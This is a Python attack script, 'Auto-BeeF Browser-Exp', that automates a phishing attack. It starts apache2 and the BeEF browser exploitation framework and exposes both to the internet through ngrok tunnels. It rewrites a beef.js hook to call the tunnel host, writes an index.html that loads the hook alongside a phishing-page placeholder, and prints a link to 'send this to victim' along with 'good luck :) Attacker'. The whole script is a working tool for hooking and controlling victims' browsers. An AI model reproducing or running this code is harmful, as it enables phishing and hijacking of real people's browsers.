import requests
import os
import sys
import time
import signal
Red ="\u001b[31m"
Green ="\u001b[32m"
if os.getuid() == 0:
    pass
else:
    print(Red+"Need Root permission")
    sys.exit()
def banner():
    os.system("clear")
    print(Green+"""   _____          __                  __________             ___________                
  /  _  \  __ ___/  |_  ____          \______   \ ____   ____\_   _____/                
 /  /_\  \|  |  \   __\/  _ \   ______ |    |  _// __ \_/ __ \|    __)                  
/    |    \  |  /|  | (  <_> ) /_____/ |    |   \  ___/\  ___/|     \                   
\____|__  /____/ |__|  \____/          |______  /\___  >\___  >___  /                   
        \/                                    \/     \/     \/    \/                    
 __________                                                   ___________               
 \______   \_______  ______  _  ________ ___________          \_   _____/__  _________  
  |    |  _/\_  __ \/  _ \ \/ \/ /  ___// __ \_  __ \  ______  |    __)_\  \/  /\____ \ 
  |    |   \ |  | \(  <_> )     /\___ \\  ___/|  | \/ /_____/  |        \>    < |  |_> >
  |______  / |__|   \____/ \/\_//____  >\___  >__|            /_______  /__/\_ \|   __/ 
         \/                          \/     \/                        \/      \/|__|    

""")
    print(Red+"Coded by youhacker55\n")
banner()

def movehook():
    os.system("sudo cp beef.js /var/www/html")
movehook()


def inplace_change(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print(Red+'"{old_string}" not found in {filename}.'.format(**locals()))
            return

    with open(filename, 'w') as f:
        print(Green+'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
        s = s.replace(old_string, new_string)
        f.write(s)


def signal_handler(sig, frame):
    print("Crtl + C detected Stopping Beef")
    os.system('sudo beef-xss-stop')
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def apache2():
    print(Green+"[+]"+"starting apache2 server and moving files")
    time.sleep(2)
    os.system("sudo service apache2 start")
    os.system("sudo touch /var/www/index.html")
apache2()
def checkngrokparam(ngrokpath, targettouse):
    with open(ngrokpath, 'r') as read_obj:
        for line in read_obj:
            if targettouse in line:
                return True
    return False


def auth():
    auth = input(Red+'entre ngrok auth:')
    os.system("ngrok authtoken " + auth)

if os.system("which ngrok >/dev/null 2>&1") == 0:
    pass
else:
    if os.system("which pip3 >/dev/null 2>&1") != 0:
        os.system("sudo apt-get install python3-pip beef-xss")
        os.system("pip3 install pyngrok")
        print(Green+"[+]""Everything installed good to go")

if os.path.exists('/root/.ngrok2/ngrok.yml') == False:
    auth()
else:
    pass


with open('/root/.ngrok2/ngrok.yml','r') as ngrok:

    while '{}' in ngrok.read():
        print(Red+"[-]""ngrok autotoken not detected")
        auth()
    else:
        pass
    g = """
tunnels:
                       first-app:
                        addr: 80
                        proto: http
                       second-app:
                        addr: 3000
                        proto: http
                        """
    if checkngrokparam('/root/.ngrok2/ngrok.yml', '#capture'):

        pass
    else:
        print(Green+'[+]'+"configuring Ngrok")
        with open('/root/.ngrok2/ngrok.yml','a') as ngrok3:
            ngrok3.write('#capture')
            ngrok3.write(g)
            ngrok3.close()



def startbeef():
    os.system('beef-xss')

try:
    url = "http://127.0.0.1:4040/api/tunnels/first-app"
    recived = requests.get(url)
    http = recived.json()["public_url"]
    url2 = 'http://127.0.0.1:4040/api/tunnels/second-app'
    recived2 = requests.get(url2)
    http2 = recived2.json()["public_url"]
    x = http[8:]
    z = http2[8:]


    inplace_change('/var/www/html/beef.js','youhacker55',"http://"+z+":80/hook.js")
    inplace_change('/var/www/html/beef.js','youhacker2',z)
    with open('/var/www/html/index.html','w') as index:
        index.write('<script src="http://'+x+'/beef.js"></script>')
        index.write('\n <p>add your own phishing page</p>')
        index.close()
    startbeef()
    print(Green+"this url for beef Panel: http://"+z+"/ui/panel")
    print(Green+"getting phsihing link")
    time.sleep(5)
    print(Green+"sendthis to victim: http://"+x)

    print(Green+"good luck :) Attacker")
    print(Red+"type CRTL + C if you want to exit")
    signal.pause()




except requests.ConnectionError:
    print("start ngrok just type:sudo ngrok  start -all ")
    exit()
